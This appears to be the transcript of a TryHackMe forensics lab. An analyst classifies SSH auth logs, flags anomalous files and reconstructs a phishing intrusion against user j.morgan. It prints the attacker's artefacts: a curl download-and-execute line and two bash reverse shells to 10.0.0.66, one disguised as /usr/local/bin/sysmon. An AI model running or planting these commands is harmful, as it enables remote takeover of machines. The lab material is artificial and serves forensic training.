@@ -1,0 +1,138 @@
+(dfir-env) ubuntu@tryhackme:~$ python3 /opt/dfir-lab/classify_logs.py /var/log/auth.log
+
+[SUSPICIOUS] Jan 15 03:00:01 tryhackme sshd[1833]: Failed password for invalid user admin from 192.168.0.100 port 22 ssh2
+[SUSPICIOUS] Jan 15 03:01:02 tryhackme sshd[1833]: Accepted password for j.morgan from 192.168.0.100 port 22 ssh2
+[SUSPICIOUS] Jan 15 03:15:00 tryhackme sshd[1833]: Accepted publickey for r.house from 192.168.0.100 port 22 ssh2
+
+
+(dfir-env) ubuntu@tryhackme:~$ python3 /opt/dfir-lab/file_anomalies.py
+[*] Scanning paths:
+    - /opt/robbco
+    - /tmp
+    - /dev/shm
+    - /usr/local/bin
+
+[!] Supervised AI-flagged suspicious files:
+                                                 path  size   entropy
+0                    /opt/robbco/sys/boot_monitor.log    59  4.535458
+1   /opt/robbco/engineering/MFBootAgent/mfboot_main.c    97  5.122591
+2           /opt/robbco/firmware/RETROS_BIOS/core.asm    54  4.358886
+3                               /tmp/dock-replace.log   235  4.842987
+4                                         /tmp/.syncd    87  4.492156
+5                                             /tmp/.x    52  4.411602
+6                               /tmp/invoice_dump.txt   709  4.653766
+10                   /dev/shm/.core_dump_2025.tgz.enc   369  5.766267
+14                              /usr/local/bin/sysmon    52  4.411602
+
+(dfir-env) ubuntu@tryhackme:~$ cat /tmp/invoice_dump.txt
+bash_history:
+cd ~/Documents/Invoices/
+libreoffice invoice_Q1_2075.ods &
+cd ~
+ls -la
+cat .ssh/config
+cat /etc/motd
+sudo nano /home/r.house/.ssh/authorized_keys
+exit
+
+users:
+root
+daemon
+bin
+sys
+sync
+games
+man
+lp
+mail
+news
+uucp
+proxy
+www-data
+backup
+list
+irc
+gnats
+nobody
+systemd-network
+systemd-resolve
+systemd-timesync
+messagebus
+syslog
+_apt
+tss
+uuidd
+tcpdump
+sshd
+landscape
+pollinate
+ec2-instance-connect
+systemd-coredump
+ubuntu
+lxd
+kernoops
+lightdm
+whoopsie
+dnsmasq
+avahi-autoipd
+usbmux
+rtkit
+avahi
+cups-pk-helper
+geoclue
+pulse
+speech-dispatcher
+saned
+nm-openvpn
+colord
+hplip
+gdm
+fwupd-refresh
+sssd
+_flatpak
+dhcpcd
+cups-browsed
+gnome-remote-desktop
+polkitd
+j.morgan
+r.house
+
+ssh_keys:
+[no keys]
+
+sessions:
+
+
+/home/j.morgan/Documents/Invoices/invoice_Q1_2075.ods
+
+Finding the email confirms our suspicions, and we are now able to reconstruct how the attacker gained initial access:
+
+1) Phishing email sent to j.morgan
+2) Malicious .ods file opened, triggering data harvesting
+3) Data saved to /tmp/invoice_dump.txt and exfiltrated to the attacker
+4) Attacker logs into j.morgan using collected or replayed credentials
+6) Access escalates from there
+(dfir-env) ubuntu@tryhackme:~$ cat /tmp/.syncd
+#!/bin/bash
+curl http://10.0.0.66/payload.sh -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x
+
+(dfir-env) ubuntu@tryhackme:~$ cat /tmp/.syncd
+#!/bin/bash
+bash -i >& /dev/tcp/10.0.0.66/4444
+
+
+(dfir-env) ubuntu@tryhackme:~$ cat /home/j.morgan/.bash_history 
+cd ~/Documents/Invoices/
+libreoffice invoice_Q1_2075.ods &
+cd ~
+ls -la
+cat .ssh/config
+cat /etc/motd
+sudo nano /home/r.house/.ssh/authorized_keys
+exit
+
+(dfir-env) ubuntu@tryhackme:~$ cat /opt/robbco/sys/boot_monitor.log
+Jan 15 03:22:10 bios_hook: UOS boot intercepted at 0x400f2
+(dfir-env) ubuntu@tryhackme:~$ cat /usr/local/bin/sysmon
+#!/bin/bash
+bash -i >& /dev/tcp/10.0.0.66/5555 0>&1
